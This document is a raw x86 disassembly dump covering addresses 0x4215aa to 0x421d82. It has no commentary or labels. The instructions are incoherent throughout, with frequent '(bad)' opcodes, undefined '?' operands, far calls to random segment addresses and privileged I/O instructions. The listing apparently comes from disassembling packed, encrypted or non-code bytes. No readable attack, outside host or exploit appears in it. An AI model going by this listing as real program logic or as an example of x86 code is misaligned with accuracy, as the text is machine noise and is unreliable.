  4215aa:	sbb    al,0xcb
  4215ac:	mov    bl,0xc1
  4215af:	sub    eax,0xe7230e74
  4215b4:	cmp    ebp,DWORD PTR [esi]
  4215b6:	push   cs
  4215b7:	xchg   ecx,eax
  4215b8:	fs in  al,dx
  4215ba:	jne    0x421588
  4215bc:	pop    edx
  4215bd:	ins    DWORD PTR es:[edi],dx
  4215be:	push   eax
  4215bf:	sub    eax,0x10ae6dd7
  4215c4:	xor    dl,bh
  4215c6:	mov    DWORD PTR [esi-0x46],edi
  4215c9:	call   0xacb5:0x5a27e6b4
  4215d0:	xor    esp,DWORD PTR [ebx]
  4215d2:	xor    eax,ebp
  4215d4:	in     al,0x90
  4215d6:	mov    ch,dl
  4215d8:	cmp    BYTE PTR [ebp+0x1],ah
  4215db:	and    DWORD PTR [edi+0x4ad2f68f],0x50673a48
  4215e5:	shr    DWORD PTR ds:[edi+0x72],cl
  4215e9:	(bad)  
  4215ea:	retf   
  4215eb:	dec    ecx
  4215ec:	jmp    0xa0e:0xf9df2916
  4215f3:	sar    BYTE PTR [ebx+0x35350faf],cl
  4215f9:	cli    
  4215fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215fb:	call   0xb9e7:0x4ae2f701
  421602:	into   
  421603:	pushf  
  421604:	adc    DWORD PTR [ecx+ebp*4+0xe],edi
  421608:	sbb    DWORD PTR [edi+0x3f],ebx
  42160b:	lea    ebx,[edx+0x10]
  42160e:	es arpl bx,di
  421611:	inc    eax
  421612:	pop    esi
  421613:	push   ebx
  421614:	pop    esi
  421615:	addr16 add al,0x5e
  421618:	ss xchg dl,dl
  42161b:	ret    0xe22e
  42161e:	xor    BYTE PTR [esp+eax*8],0x5
  421622:	push   es
  421623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421624:	mov    ebp,0x4438597a
  421629:	aaa    
  42162a:	xor    BYTE PTR [eax],dh
  42162c:	dec    edi
  42162d:	aaa    
  42162e:	inc    esi
  42162f:	prefetchwt1 (bad)
  421630:	or     eax,0x81dc0bd4
  421635:	sar    DWORD PTR [ebx-0x52],0x7c
  421639:	add    ch,BYTE PTR [esi+0x310e6874]
  42163f:	stos   BYTE PTR es:[edi],al
  421640:	sub    BYTE PTR [ebp-0x6a5d0f89],bh
  421646:	mov    dh,0x99
  421648:	pusha  
  421649:	shr    edi,cl
  42164b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42164c:	inc    esp
  42164d:	stc    
  42164e:	retf   0xad11
  421651:	lds    ecx,FWORD PTR [edx]
  421653:	fwait
  421654:	cmp    ch,bl
  421656:	add    cl,BYTE PTR [ebp+0x28]
  421659:	imul   ebp,ebp,0x64b83148
  42165f:	add    ebp,DWORD PTR [eax]
  421661:	adc    BYTE PTR [esi+0xf69c662],cl
  421667:	adc    BYTE PTR [edi+0x6e],bl
  42166a:	das    
  42166b:	xchg   DWORD PTR [ecx],ecx
  42166d:	xor    DWORD PTR [ebp+0x67],esi
  421670:	adc    BYTE PTR [edi],bh
  421672:	fild   DWORD PTR [eax-0x669afabd]
  421678:	fiadd  WORD PTR [esi-0x5aae598]
  42167e:	push   es
  42167f:	mul    BYTE PTR [esi-0x6b]
  421682:	pushf  
  421683:	jne    0x42165d
  421685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421686:	push   edx
  421687:	in     al,0x46
  421689:	adc    dl,0x99
  42168c:	stc    
  42168d:	clc    
  42168e:	sub    al,0xcf
  421690:	adc    eax,0xba7f9da
  421695:	test   eax,0x9024e47f
  42169a:	ficomp DWORD PTR fs:[esi+0x42894633]
  4216a1:	mov    WORD PTR [ebx],es
  4216a3:	aad    0xa7
  4216a5:	call   0x5c68:0xb9503540
  4216ac:	jge    0x42170e
  4216ae:	inc    ecx
  4216af:	shl    DWORD PTR [edi],0x46
  4216b2:	sub    dh,cl
  4216b4:	imul   ecx,DWORD PTR [edx],0x59d7e80f
  4216ba:	gs jl  0x421708
  4216bd:	mov    ds,WORD PTR [ecx-0xe19dcf]
  4216c3:	xchg   edx,eax
  4216c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216c5:	and    al,0x3d
  4216c7:	ret    0x1498
  4216ca:	mov    bl,BYTE PTR [ebx-0x160c61cf]
  4216d0:	sahf   
  4216d1:	es push ecx
  4216d3:	call   0xb88aded6
  4216d8:	mov    ds:0xd7d61341,al
  4216dd:	or     al,0x65
  4216df:	out    0x43,eax
  4216e1:	xchg   esp,eax
  4216e2:	fidiv  WORD PTR [edx+ebp*8-0x53c345d9]
  4216e9:	lods   eax,DWORD PTR ds:[esi]
  4216ea:	pop    esi
  4216eb:	fisubr DWORD PTR [ecx+0xa48]
	...
  4216f9:	add    BYTE PTR [eax],ah
  4216fb:	push   ss
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	test   BYTE PTR [eax+edx*1-0x12],0x19
  42170a:	lock xchg edx,eax
  42170c:	add    DWORD PTR [eax],eax
  42170e:	std    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [edx-0x5c67f006],al
  421717:	hlt    
  421718:	das    
  421719:	stos   DWORD PTR es:[edi],eax
  42171a:	fwait
  42171b:	dec    esp
  42171c:	popf   
  42171d:	mov    esi,0x15359e3b
  421722:	pushf  
  421723:	fcom   DWORD PTR [ebp+0x37]
  421726:	sbb    DWORD PTR ss:[eax+0x3c0d8dba],0xd535c0b0
  421731:	stos   DWORD PTR es:[edi],eax
  421732:	and    ch,BYTE PTR [ecx-0x62]
  421735:	fsqrt  
  421737:	and    BYTE PTR [esi],cl
  421739:	and    al,0x37
  42173b:	mov    dl,0xcb
  42173d:	push   edx
  42173e:	cld    
  42173f:	mov    al,ds:0x520c2ac1
  421744:	mov    al,ds:0x93e14afc
  421749:	xor    bl,BYTE PTR [ecx-0x34dda88c]
  42174f:	iret   
  421750:	cwde   
  421751:	retf   0xa4e3
  421754:	or     dl,0x9f
  421757:	xor    eax,0x4423dbec
  42175c:	cmp    DWORD PTR [edx],ebp
  42175e:	jge    0x421725
  421760:	xchg   ecx,eax
  421761:	(bad)  
  421762:	loop   0x421720
  421764:	push   esp
  421765:	pop    es
  421766:	mov    esp,0x8c6d795d
  42176b:	xchg   esp,eax
  42176c:	fwait
  42176d:	inc    esp
  42176e:	pop    es
  42176f:	mov    bh,0xa3
  421771:	adc    eax,0xadd484f1
  421776:	test   al,0x2a
  421778:	loopne 0x421729
  42177a:	loop   0x42170e
  42177c:	sub    eax,0x6aef49de
  421781:	ror    dh,1
  421783:	neg    BYTE PTR [esi+0x30]
  421786:	mov    esp,0xb66305c
  42178b:	pop    esi
  42178c:	mov    esp,0x17a3f913
  421791:	addr16 xor al,0xec
  421795:	mov    WORD PTR ds:0xd1a40a9d,ds
  42179b:	iret   
  42179c:	xor    edx,ecx
  42179e:	pop    ebp
  42179f:	cmc    
  4217a0:	dec    ebx
  4217a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217a2:	idiv   BYTE PTR [edx]
  4217a4:	pop    esi
  4217a5:	(bad)  
  4217a6:	leave  
  4217a7:	xor    al,BYTE PTR [ebx+0x24]
  4217aa:	sbb    DWORD PTR [esi],ecx
  4217ac:	addr16 in al,0x7d
  4217af:	inc    ebp
  4217b0:	xor    BYTE PTR [edx],dl
  4217b2:	inc    esi
  4217b3:	cli    
  4217b4:	into   
  4217b5:	popf   
  4217b6:	ret    
  4217b7:	lods   eax,DWORD PTR ds:[esi]
  4217b8:	dec    edi
  4217b9:	fwait
  4217ba:	push   ecx
  4217bb:	pushw  cs
  4217bd:	dec    esi
  4217be:	xor    eax,0x1b685b23
  4217c3:	ja     0x4217dd
  4217c5:	add    ecx,DWORD PTR [ecx+0x50]
  4217c8:	enter  0xbcce,0xfc
  4217cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217cd:	add    eax,0x240e01f9
  4217d2:	sub    eax,0x25aace5f
  4217d7:	pop    ss
  4217d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d9:	xchg   ecx,eax
  4217da:	jno    0x421780
  4217dc:	scas   al,BYTE PTR es:[edi]
  4217dd:	mov    ebp,0x62399221
  4217e2:	jbe    0x42183f
  4217e4:	jbe    0x42179e
  4217e6:	jne    0x4217b6
  4217e8:	clc    
  4217e9:	rol    BYTE PTR [ebx+0xb5dc817],1
  4217ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217f0:	inc    eax
  4217f1:	jle    0x42181a
  4217f3:	popf   
  4217f4:	sub    esi,DWORD PTR [eax+0x4d]
  4217f7:	mov    edi,0xd248f4b
  4217fc:	mov    cl,0x2c
  4217fe:	push   esi
  4217ff:	xchg   esi,eax
  421800:	push   0xffffffe1
  421802:	repnz push edx
  421804:	retf   0x8921
  421807:	xchg   esi,eax
  421808:	aas    
  421809:	dec    bl
  42180b:	mov    es,WORD PTR [eax]
  42180d:	in     al,0xd4
  42180f:	jecxz  0x4217c7
  421811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421812:	push   es
  421813:	les    ebx,FWORD PTR [edx+0x78]
  421816:	sbb    esi,esi
  421818:	dec    ebp
  421819:	jle    0x4217e8
  42181b:	call   0x3831:0xe243b5cb
  421822:	(bad)  
  421823:	cli    
  421824:	mov    dh,0x60
  421826:	(bad)  
  421827:	dec    ebp
  421828:	imul   eax,DWORD PTR ds:[edx-0x3a],0xffffff8d
  42182d:	pop    es
  42182e:	jo     0x421881
  421830:	jmp    0x2d72e671
  421835:	fs mov ss,ecx
  421838:	ja     0x42185d
  42183a:	aaa    
  42183b:	daa    
  42183c:	test   edx,ebp
  42183e:	ss mov ebp,0x4a22a5a
  421844:	sbb    DWORD PTR [ecx+eax*1-0x76a32d71],ebx
  42184b:	lods   al,BYTE PTR ds:[esi]
  42184c:	xchg   ebp,esp
  42184e:	(bad)  
  42184f:	lds    ebx,FWORD PTR [edi+0x2]
  421852:	out    dx,al
  421853:	sub    al,0x37
  421855:	in     eax,dx
  421856:	or     dl,BYTE PTR ds:0x4a5664dc
  42185c:	xchg   esi,esi
  42185e:	add    eax,0x7d833501
  421863:	push   eax
  421864:	(bad)  
  421865:	bound  eax,QWORD PTR [ebp-0x6cf3938d]
  42186b:	xchg   ecx,eax
  42186c:	mov    al,0x81
  42186e:	leave  
  42186f:	push   ss
  421870:	jmp    FWORD PTR [ebx-0x2c]
  421873:	(bad)  
  421875:	(bad)  [edi-0x8]
  421878:	call   0xd64e0e9a
  42187d:	ja     0x42185c
  42187f:	sub    BYTE PTR [esi-0x15],0x8d
  421883:	sbb    DWORD PTR fs:[ebx],ebp
  421886:	and    BYTE PTR [ecx],al
  421888:	pop    eax
  421889:	ds int 0x9c
  42188c:	jno    0x42189b
  42188e:	fnstsw WORD PTR [ecx]
  421890:	jmp    0x292182c9
  421895:	mov    ebx,0xfaa9ef41
  42189a:	outs   dx,DWORD PTR ds:[esi]
  42189b:	mov    eax,ds:0xa68c4e09
  4218a0:	and    dl,BYTE PTR [eax]
  4218a2:	cld    
  4218a3:	xor    cl,BYTE PTR [edi]
  4218a5:	mov    bh,0xc2
  4218a7:	xlat   BYTE PTR ds:[ebx]
  4218a8:	(bad)  
  4218a9:	push   ss
  4218aa:	mov    ch,al
  4218ac:	sub    BYTE PTR [ebx-0x39],bh
  4218af:	std    
  4218b0:	lock dec edi
  4218b2:	mov    bh,0x1c
  4218b4:	or     ebp,DWORD PTR [eax]
  4218b6:	push   edx
  4218b7:	mov    al,bl
  4218b9:	mov    BYTE PTR ds:0xfec7d529,al
  4218bf:	mov    al,ds:0x98f7bbc9
  4218c4:	cwde   
  4218c5:	enter  0xdf3c,0xaa
  4218c9:	cmp    eax,DWORD PTR [ecx]
  4218cb:	sbb    cl,dl
  4218cd:	sbb    al,0xde
  4218cf:	mov    eax,ds:0x6ca1f50b
  4218d4:	idiv   eax
  4218d6:	cmp    esp,ebp
  4218d8:	pusha  
  4218d9:	push   ebp
  4218da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218db:	and    BYTE PTR ds:0xc1c07a5d,dl
  4218e1:	jne    0x4218a0
  4218e3:	iret   
  4218e4:	xchg   ebp,eax
  4218e5:	loopne 0x42193a
  4218e7:	shl    DWORD PTR [edi],1
  4218e9:	mov    edi,0x46c36d3a
  4218ee:	jmp    0xec60d3b2
  4218f3:	mov    BYTE PTR [ecx-0x1cfc962e],bl
  4218f9:	call   0x3f456ce6
  4218fe:	test   al,0x69
  421900:	fld    TBYTE PTR [esi]
  421902:	sbb    eax,0xd987e8f8
  421907:	ins    DWORD PTR es:[edi],dx
  421908:	ret    0x4b0e
  42190b:	mov    ds:0x72c19d,al
	...
  421918:	add    BYTE PTR [eax],al
  42191a:	mov    al,0x33
  42191c:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  421922:	pop    DWORD PTR [edx-0x44]
  421925:	mov    ah,BYTE PTR [edi]
  421927:	pop    ecx
  421928:	std    
  421929:	dec    edi
  42192a:	in     eax,dx
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	std    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [esi-0xd3c4889],dh
  421937:	test   BYTE PTR [eax+edx*4-0x61],bh
  42193b:	out    0x40,eax
  42193d:	leave  
  42193e:	jle    0x421985
  421940:	sub    BYTE PTR [esi-0x31],dh
  421943:	arpl   WORD PTR [edx+ebp*1-0x7],bx
  421947:	jmp    0x4219ba
  421949:	cmc    
  42194a:	loope  0x421914
  42194c:	mov    BYTE PTR [esi+eax*8-0x387d8eb3],al
  421953:	int    0x13
  421955:	aas    
  421956:	push   ebp
  421957:	jp     0x4218e4
  421959:	xor    BYTE PTR [ebx-0x7957cf0],bl
  42195f:	cdq    
  421960:	call   0xeacf6a9c
  421965:	fs ins DWORD PTR es:[edi],dx
  421967:	jle    0x4219e6
  421969:	or     BYTE PTR [edi+eax*8+0x515df80b],bh
  421970:	aam    0x65
  421972:	pusha  
  421973:	pop    esi
  421974:	and    ecx,DWORD PTR [ebp+0x36]
  421977:	jne    0x4219a3
  421979:	jmp    0xde5256b2
  42197e:	or     DWORD PTR [esi],edi
  421980:	xchg   BYTE PTR [ebx],bl
  421982:	loope  0x421995
  421984:	pop    ebp
  421985:	outs   dx,BYTE PTR ds:[esi]
  421986:	loop   0x42199c
  421988:	retf   
  421989:	lahf   
  42198a:	fidiv  DWORD PTR [edi-0x63]
  42198d:	test   DWORD PTR [ecx+0x11],ebx
  421990:	je     0x4219af
  421992:	pop    esi
  421993:	mov    cs,ebx
  421995:	test   BYTE PTR [edi+0x4],bh
  421998:	or     al,0xd5
  42199a:	mov    esp,gs
  42199c:	add    ch,BYTE PTR [edi+eiz*4+0x6835028d]
  4219a3:	jno    0x4219a2
  4219a5:	push   ecx
  4219a6:	sbb    al,0x0
  4219a8:	adc    al,0xd2
  4219aa:	(bad)  
  4219ab:	adc    cl,BYTE PTR [eax-0xa66e662]
  4219b1:	repz jmp 0x421a18
  4219b4:	adc    cl,BYTE PTR [edi+0x4c79df3f]
  4219ba:	pop    ecx
  4219bb:	pop    ebp
  4219bc:	clc    
  4219bd:	imul   esp,DWORD PTR [ecx],0xffffffa4
  4219c0:	gs push cs
  4219c2:	aas    
  4219c3:	outs   dx,DWORD PTR ds:[esi]
  4219c4:	mov    ds:0xe01fd423,al
  4219c9:	jno    0x4219f6
  4219cb:	test   al,0xe7
  4219cd:	int3   
  4219ce:	fisubr DWORD PTR [eax-0x29]
  4219d1:	inc    ecx
  4219d2:	ret    
  4219d3:	nop
  4219d4:	ror    ecx,0x85
  4219d7:	inc    esi
  4219d8:	mov    esi,0xdf10473a
  4219dd:	div    ah
  4219df:	(bad)  
  4219e1:	pop    esp
  4219e2:	fisub  WORD PTR [edi-0x2a9eaeb8]
  4219e8:	push   ebp
  4219e9:	ret    
  4219ea:	hlt    
  4219eb:	test   edi,edi
  4219ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219ee:	(bad)  
  4219ef:	loope  0x421a1e
  4219f1:	adc    esp,esi
  4219f3:	out    0xb6,eax
  4219f5:	call   0x645bb473
  4219fa:	fwait
  4219fb:	add    ah,al
  4219fd:	in     eax,0x35
  4219ff:	push   0x96943c26
  421a04:	loope  0x4219c3
  421a06:	mov    esp,0x1f923e0a
  421a0b:	js     0x421a66
  421a0d:	pop    edx
  421a0e:	call   0x59aa:0x9768e8d8
  421a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a16:	jp     0x421a58
  421a18:	pop    dx
  421a1a:	inc    ecx
  421a1b:	mov    dh,0xbe
  421a1d:	sbb    al,0xfe
  421a1f:	clc    
  421a20:	sbb    ch,BYTE PTR [ecx+0x85a6184]
  421a26:	jbe    0x421a1d
  421a28:	jae    0x4219f7
  421a2a:	mov    cl,0x1d
  421a2c:	hlt    
  421a2d:	cli    
  421a2e:	cmc    
  421a2f:	retf   
  421a30:	scas   eax,DWORD PTR es:[edi]
  421a31:	adc    ecx,DWORD PTR [ebp-0xe]
  421a34:	or     BYTE PTR [edx-0x80],al
  421a37:	dec    edi
  421a38:	dec    ebx
  421a39:	jno    0x421a61
  421a3b:	cmp    DWORD PTR [edx+0x4cc4cd8b],ebp
  421a41:	jg     0x421a44
  421a43:	jbe    0x421a29
  421a45:	mov    gs,WORD PTR ds:0xb432005c
  421a4b:	lods   al,BYTE PTR ds:[esi]
  421a4c:	adc    DWORD PTR [ebx],ebp
  421a4e:	mov    ebx,0x1385583c
  421a53:	cs push es
  421a55:	sub    cl,ah
  421a57:	test   eax,0x92e41bed
  421a5c:	adc    al,BYTE PTR [esi-0x6f]
  421a5f:	js     0x421aa7
  421a61:	test   eax,0x6d8338b7
  421a66:	sub    bh,BYTE PTR [edx+ecx*1]
  421a69:	ret    0xf248
  421a6c:	add    al,0x64
  421a6e:	lea    esp,[esi-0x403016fd]
  421a74:	dec    ebp
  421a75:	retf   0x27ca
  421a78:	adc    cl,BYTE PTR [edi+ebx*2]
  421a7b:	leave  
  421a7c:	in     eax,dx
  421a7d:	inc    esi
  421a7e:	scas   eax,DWORD PTR es:[edi]
  421a7f:	jle    0x421ad5
  421a81:	rcl    BYTE PTR [ecx-0x3f],0x1
  421a85:	pop    ss
  421a86:	cmp    DWORD PTR [ebx+0x8],ebp
  421a89:	mov    bh,0x31
  421a8b:	cmp    bh,al
  421a8d:	push   cs
  421a8e:	xchg   ebp,eax
  421a8f:	and    ah,BYTE PTR [ebx]
  421a91:	add    cl,BYTE PTR [ebp+0x373b96d7]
  421a97:	jmp    0x421ace
  421a99:	mov    ecx,edx
  421a9b:	mov    edi,ebp
  421a9d:	(bad)
  421aa0:	mov    al,ds:0x47a1c1b4
  421aa5:	adc    eax,0x3bfb0283
  421aaa:	clc    
  421aab:	shl    edi,cl
  421aad:	jno    0x421a6c
  421aaf:	adc    DWORD PTR [ebp-0x52c0d448],ebp
  421ab5:	lods   al,BYTE PTR ds:[esi]
  421ab6:	addr16 cmp eax,0xd21b8fde
  421abc:	(bad)  
  421abd:	frstpm(287 only) 
  421abf:	add    bl,ch
  421ac1:	psrad  mm0,mm6
  421ac4:	xchg   ecx,eax
  421ac5:	xor    dh,BYTE PTR [eax]
  421ac7:	nop
  421ac8:	cmp    BYTE PTR [ebp+0x4ac136e2],0x4d
  421acf:	xor    edi,DWORD PTR [ebx-0x77]
  421ad2:	out    0x5b,eax
  421ad4:	jp     0x421b4c
  421ad6:	test   edx,0x61ef99be
  421adc:	or     DWORD PTR ds:0x1e24261a,edi
  421ae2:	hlt    
  421ae3:	mov    esi,0x5fa5d74d
  421ae8:	test   al,0x13
  421aea:	xlat   BYTE PTR ds:[ebx]
  421aeb:	not    DWORD PTR [ebp-0x135bf33]
  421af1:	(bad)  
  421af2:	call   0xb22e:0xaa37583b
  421af9:	pusha  
  421afa:	pop    esi
  421afb:	fcom   QWORD PTR ds:0xc12119fa
  421b01:	mov    ch,0x4a
  421b03:	aaa    
  421b04:	dec    esp
  421b05:	mov    ah,0x3a
  421b07:	or     al,0xee
  421b09:	jecxz  0x421af6
  421b0b:	jle    0x421aa3
  421b0d:	cld    
  421b0e:	call   0x3abb4036
  421b13:	or     bl,ah
  421b15:	rcr    BYTE PTR [eax],cl
  421b17:	dec    ecx
  421b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b19:	sbb    ebp,0xffffffda
  421b1c:	cmp    al,0x28
  421b1e:	clc    
  421b1f:	out    0x65,eax
  421b21:	cmp    DWORD PTR [edi+0x3bd16de6],ebx
  421b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b28:	add    eax,0xfa834c26
  421b2d:	dec    ecx
  421b2e:	xchg   edi,eax
	...
  421b37:	add    BYTE PTR [eax],al
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0xcbf5f8f7
  421b48:	ficom  DWORD PTR [ecx]
  421b4a:	jmp    0x1:0xfd000196
  421b51:	add    BYTE PTR [ebp-0x4d],ch
  421b54:	push   ecx
  421b55:	pop    ecx
  421b56:	(bad)  
  421b57:	jbe    0x421b53
  421b59:	add    esp,esp
  421b5b:	std    
  421b5c:	sar    BYTE PTR [ebp-0x14656fd3],0x75
  421b63:	imul   ebx,esi,0xffffff8b
  421b66:	rcr    DWORD PTR [edi-0x17],cl
  421b69:	push   ecx
  421b6a:	jbe    0x421b41
  421b6c:	(bad)  
  421b6d:	imul   esp,DWORD PTR [ebx],0xffffffa6
  421b70:	and    DWORD PTR ds:0x8a905e85,edx
  421b76:	xor    al,0x8
  421b78:	pushf  
  421b79:	into   
  421b7a:	pop    esp
  421b7b:	ja     0x421bb6
  421b7d:	or     eax,0xd5e4b865
  421b82:	rol    dh,0xe
  421b85:	cdq    
  421b86:	scas   al,BYTE PTR es:[edi]
  421b87:	int3   
  421b88:	out    0x33,al
  421b8a:	mov    ah,0xe7
  421b8c:	push   esp
  421b8d:	test   DWORD PTR [eax],ecx
  421b8f:	test   dl,bl
  421b91:	cs aas 
  421b93:	outs   dx,DWORD PTR ds:[esi]
  421b94:	ins    BYTE PTR es:[edi],dx
  421b95:	clc    
  421b96:	push   eax
  421b97:	mov    ah,0x66
  421b99:	inc    ebx
  421b9a:	push   cs
  421b9b:	mov    ds:0x8a1147c3,al
  421ba0:	out    dx,eax
  421ba1:	jns    0x421b55
  421ba3:	sub    BYTE PTR [edi],dl
  421ba5:	mov    eax,0x7ec3ab32
  421baa:	mov    ecx,0xe0221b89
  421baf:	mov    ah,0xa0
  421bb1:	data16 (bad) 
  421bb3:	pop    esp
  421bb4:	xchg   esi,eax
  421bb5:	fs in  eax,dx
  421bb7:	(bad)  
  421bb9:	jmp    0xf21cac1e
  421bbe:	fld    DWORD PTR [eax+0x2eccf1ba]
  421bc4:	xchg   ebx,edi
  421bc6:	adc    DWORD PTR [ebp+0x35378892],ebp
  421bcc:	pop    edi
  421bcd:	dec    ecx
  421bce:	sub    DWORD PTR [eax],esp
  421bd0:	jne    0x421c0a
  421bd2:	pop    eax
  421bd3:	sub    DWORD PTR [edx],ecx
  421bd5:	loopne 0x421bb3
  421bd7:	(bad)  
  421bd8:	call   0x9610b396
  421bdd:	inc    eax
  421bde:	loopne 0x421c10
  421be0:	sub    eax,0x38508749
  421be5:	adc    DWORD PTR [eax],ecx
  421be7:	sti    
  421be8:	mov    eax,0x5ee5384c
  421bed:	mov    cl,0xc
  421bef:	xor    dl,dh
  421bf1:	aaa    
  421bf2:	fmul   DWORD PTR [ebx+ebp*2+0x55]
  421bf6:	(bad)  
  421bf7:	mov    ch,0x1
  421bf9:	sbb    ecx,edi
  421bfb:	jbe    0x421c4a
  421bfd:	test   al,0x1b
  421bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c00:	ins    DWORD PTR es:[edi],dx
  421c01:	mov    edx,DWORD PTR [eax]
  421c03:	repnz dec eax
  421c05:	jg     0x421c1b
  421c07:	jge    0x421c83
  421c09:	push   ebx
  421c0a:	call   0x637a:0xb6613810
  421c11:	mov    al,0x7e
  421c13:	or     BYTE PTR [edi],0x7c
  421c16:	cmp    cl,ch
  421c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c19:	call   0xb7065bd4
  421c1e:	sub    dl,BYTE PTR [bx-0x7859]
  421c23:	imul   ebx,DWORD PTR [edx-0x46498acc],0x2a9fec33
  421c2d:	pop    edx
  421c2e:	inc    ebx
  421c2f:	call   0x86e5:0x3dbd6443
  421c36:	mov    edx,0x2217328f
  421c3b:	add    ebx,DWORD PTR [ecx+0x5c]
  421c3e:	pop    es
  421c3f:	mov    ah,0x58
  421c41:	inc    esp
  421c42:	mov    ds,WORD PTR [eax]
  421c44:	cmp    eax,0x7b52daa5
  421c49:	sub    esi,DWORD PTR [ebx]
  421c4b:	mov    edi,0xed5de6ec
  421c50:	das    
  421c51:	int3   
  421c52:	mov    esp,DWORD PTR [esp+esi*1-0x3]
  421c56:	push   edx
  421c57:	sbb    esi,0xffffff9f
  421c5a:	pop    ds
  421c5b:	int    0x1d
  421c5d:	sub    eax,DWORD PTR [eax+0x196716be]
  421c63:	leave  
  421c64:	mov    bh,0xf2
  421c66:	aad    0x9e
  421c68:	cli    
  421c69:	stos   DWORD PTR es:[edi],eax
  421c6a:	xor    cl,BYTE PTR [eax+0x75]
  421c6d:	push   edx
  421c6e:	hlt    
  421c6f:	mov    ds:0x8c621bd0,al
  421c74:	xchg   edi,eax
  421c75:	in     al,0xf2
  421c77:	clc    
  421c78:	ret    
  421c79:	loopne 0x421bfc
  421c7b:	das    
  421c7c:	js     0x421cbe
  421c7e:	cmp    al,0xae
  421c80:	jl     0x421c36
  421c82:	lods   eax,DWORD PTR ds:[esi]
  421c83:	and    DWORD PTR [esi+0x1d],0xffffff88
  421c87:	cdq    
  421c88:	call   0x3088:0xb8543234
  421c8f:	repnz int 0xab
  421c92:	jae    0x421c14
  421c94:	retf   
  421c95:	gs enter 0x9d4b,0xd8
  421c9a:	enter  0xd421,0xc5
  421c9e:	(bad)  
  421c9f:	jecxz  0x421c85
  421ca1:	cwde   
  421ca2:	sub    BYTE PTR [ebp+0x12ed012e],ch
  421ca8:	pop    edi
  421ca9:	and    DWORD PTR [ecx-0x31],ecx
  421cac:	push   ds
  421cad:	mov    ?,WORD PTR ds:0x37c819c6
  421cb3:	daa    
  421cb4:	mov    ch,BYTE PTR [edx+0x3b]
  421cb7:	push   ebp
  421cb8:	rol    BYTE PTR [edx],cl
  421cba:	fwait
  421cbb:	pop    ebp
  421cbc:	cmp    al,0x1c
  421cbe:	repz sub ah,BYTE PTR [esp+ecx*8-0x5]
  421cc3:	mov    ch,0xdc
  421cc5:	loope  0x421d08
  421cc7:	xchg   DWORD PTR [edi+0x4],esp
  421cca:	fsub   DWORD PTR [ecx-0x7c21999f]
  421cd0:	inc    ebx
  421cd1:	pushf  
  421cd2:	das    
  421cd3:	mov    ?,ebp
  421cd5:	pop    edx
  421cd6:	jecxz  0x421c6f
  421cd8:	call   0xba4f6f4b
  421cdd:	mov    esp,ecx
  421cdf:	imul   ax,WORD PTR [ebx+0x4b],0x72
  421ce4:	mov    bl,0xa5
  421ce6:	mov    eax,ecx
  421ce8:	pop    es
  421ce9:	mov    WORD PTR [edi+edx*1],?
  421cec:	outs   dx,BYTE PTR ds:[esi]
  421ced:	mov    eax,0xa64d59d7
  421cf2:	dec    eax
  421cf3:	pusha  
  421cf4:	das    
  421cf5:	out    dx,eax
  421cf6:	xor    eax,0xc6804c6d
  421cfb:	repz adc BYTE PTR [edx],ch
  421cfe:	icebp  
  421cff:	push   cs
  421d00:	inc    ebx
  421d01:	cdq    
  421d02:	call   0x42dc:0xedf3b084
  421d09:	iret   
  421d0a:	repnz add bl,BYTE PTR [edi]
  421d0d:	xchg   esi,eax
  421d0e:	sbb    eax,0x7ee9d9de
  421d13:	add    ebp,ecx
  421d15:	(bad)  
  421d16:	and    BYTE PTR [ebp+eiz*1+0x31],dh
  421d1a:	aad    0x9d
  421d1c:	test   al,0xaf
  421d1e:	ret    
  421d1f:	xor    al,0xad
  421d21:	or     esp,DWORD PTR [edx]
  421d23:	out    dx,eax
  421d24:	int    0x98
  421d26:	rcl    BYTE PTR [ebx+0x14fd40b1],1
  421d2c:	mov    ebp,esi
  421d2e:	cld    
  421d2f:	sbb    eax,0x21834233
  421d34:	and    bh,BYTE PTR [esi-0x28]
  421d37:	retf   0xc233
  421d3a:	and    ah,BYTE PTR [esi+0x5a]
  421d3d:	ret    0x4e71
  421d40:	or     al,BYTE PTR [esi]
  421d42:	xor    bl,BYTE PTR [eax-0x60748c60]
  421d48:	fidiv  WORD PTR [esi-0x2775a2b0]
  421d4e:	out    dx,eax
	...
  421d57:	add    BYTE PTR [eax],al
  421d59:	add    BYTE PTR [ebx+0x7d7539cf],bh
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	adc    eax,0xe7ac6b4f
  421d6b:	cwde   
  421d6c:	add    DWORD PTR [eax],eax
  421d6e:	std    
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [eax],ch
  421d73:	sub    edx,DWORD PTR [esi+0x1292f01a]
  421d79:	in     al,0x5b
  421d7b:	(bad)  
  421d7c:	mov    edi,0x71f879e9
  421d81:	lods   eax,DWORD PTR ds:[esi]
  421d82:	inc    eax
